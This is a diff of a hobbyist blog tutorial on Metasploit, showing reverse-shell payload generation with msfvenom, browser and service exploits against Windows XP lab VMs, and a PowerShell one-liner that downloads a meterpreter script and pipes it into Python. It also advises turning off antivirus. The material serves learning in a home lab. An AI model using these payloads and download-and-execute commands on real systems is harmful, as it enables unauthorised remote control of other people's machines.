@@ -3,7 +3,7 @@ Metasploit
 
 :date: 2021-07-30 20:15
 :tags: security, linux, hacking, metasploit, reverse shell,
-:summary: ...
+:summary: Fun with Metasplot, aka How To Hack
 
 I am a software developer and no a security researcher. But it is still
 important to master the current security principles. Of course you can read all
@@ -18,6 +18,17 @@ try it out and present the results.
 
 The Basics
 ----------
+There are a lot of tools to have fun with security. We are going to use
+Metasploit. I think you can install it on your system, but I work with Kali for
+any security task I have. By the way I run Kali on
+`Virtualbox <https://www.virtualbox.org>`__.
+What I also use for my vulnerable targets.
+
+  * `Kali <https://www.kali.org/get-kali/#kali-virtual-machines>`__
+  * `Windows 10/8/7 <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/#downloads>`__
+  * `Windows 10 Development environment <https://developer.microsoft.com/de-de/windows/downloads/virtual-machines/>`__
+  * `Windows XP <https://isoriver.com/windows-xp-iso-download/>`__
+
 The basic steps for exploiting a system are:
 
   1. Choosing and configuring an exploit
@@ -28,25 +39,14 @@ The basic steps for exploiting a system are:
   3. Executing the exploit.
       ..
 
-There are a few tools to handle these steps. We are going to use Metasploit. I
-think you can install it on your system, but I work with Kali for any security
-task I have. By the way I run Kali on
-`Virtualbox <https://www.virtualbox.org>`__.
-This I also use for my targets.
-
-  * `Kali <https://www.kali.org/get-kali/#kali-virtual-machines>`__
-  * `Windows 10/8/7 <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/#downloads>`__
-  * `Windows 10 Development environment <https://developer.microsoft.com/de-de/windows/downloads/virtual-machines/>`__
-  * `Windows XP <https://isoriver.com/windows-xp-iso-download/>`__
-
 
 Example 0x01 - Revers Shell
 ---------------------------
 You can create an executable file, that will connect to your device. Almost any
 security scanner will detect this file. But anyway let us use this for the first
-try. You may need to turn off your virus program.
-
-This is the finale result, all commands below the video:
+try. You may need to turn off your virus program. As you can see in the video,
+Windows also detects and deletes this file, even though I had switched off
+Windows Defender. This is the finale result, all commands below the video:
 
 .. image:: {static}/images/articels/security/metasploit-001.gif
   :width: 100 %
@@ -64,8 +64,8 @@ Run web server with python to copy the file to the target:
 
   $ python3 -m http.server
 
-Now you can download the file on the target. Be for we execute it, we have to
-setup metasploit. Open metasploit
+Now you can download the file on the target. Before we execute it, we have to
+setup Metasploit. Open Metasploit
 
 .. code-block:: bash
 
@@ -89,6 +89,14 @@ Now execute the file on the target device.
 
 Example 0x02 - Internet Explorer 6
 ----------------------------------
+You see from the example before: If your system is up to date, it's hard to
+execute an existing exploit. Now we will use something old, and slowly -
+Internet Explorer 6. Yes the old on from Windows XP.
+
+This is also a more realistic example. There is a program with a critical
+security problem. If the user is interacting with the wrong data, you can take
+over the system. For this exploit: Take the Internet Explorer 6 and visit the
+wrong url.
 
 This is how it looks, the commands are under the video:
 
@@ -96,7 +104,7 @@ This is how it looks, the commands are under the video:
   :width: 100 %
   :alt: alternate text
 
-Start metasploit
+Start Metasploit
 
 .. code-block:: bash
 
@@ -127,7 +135,8 @@ and set it up:
   [*] Using URL: http://192.168.178.41:80/
   [*] Server started.
 
-If you now visit  http://192.168.178.41/ with Internet Explorer,m you should see something like:
+If you now visit  http://192.168.178.41/ with Internet Explorer, you should see
+something like:
 
 .. code-block:: bash
 
@@ -165,14 +174,15 @@ You can now interact with the session:
 
 Example 0x03 - Windows XP
 -------------------------
-
+We're still on Windows XP. But now with a program that runs in the background.
+The user doesn't have to do anything and we can still take over the system.
 Again the finale result and the commands are below:
 
 .. image:: {static}/images/articels/security/metasploit-003.gif
   :width: 100 %
   :alt: alternate text
 
-Start metasploit
+Start Metasploit
 
 .. code-block:: bash
 
@@ -213,6 +223,11 @@ dangers Windows XP is?
 
 Example 0x04 - Python
 ---------------------
+Of course there are also complex methods of executing code on the target system.
+The example is similar to the first, the user has to execute a command. Which
+loads the code and runs it with Python. We assume that Python is installed on
+the target. Since the payload is loaded directly into the memory, we can use
+Windows 10 again. And Windows Defender can also be activated.
 
 You know it, scroll for the commands or enjoy the video:
 
@@ -225,7 +240,7 @@ You know it, scroll for the commands or enjoy the video:
   $ msfvenom -p python/meterpreter/reverse_tcp  LHOST=192.168.178.41 LPORT=5555 -f raw > shell.py
   $ python3 -m http.server
 
-Now we quick config metasploit:
+Now we quick config Metasploit:
 
 .. code-block:: bash
 
@@ -249,10 +264,16 @@ On the target we open the PowerShell and execute:
   (new-object net.webclient).DownloadString('http://192.168.178.41:8000/shell.py') | python
 
 This will load and execute the python script. Now you have access to the target
-system with metasploit:
+system with Metasploit:
 
 .. code-block:: bash
 
   [*] Meterpreter session 1 opened (192.168.178.41:5555 -> 192.168.178.42:49636) at 2021-07-26 05:30:28 -0400
 
   meterpreter >
+
+
+Conclusion
+==========
+This is funny. I enjoy playing with some security tools. And knowing some Issues
+from other programs will make you write better source code.
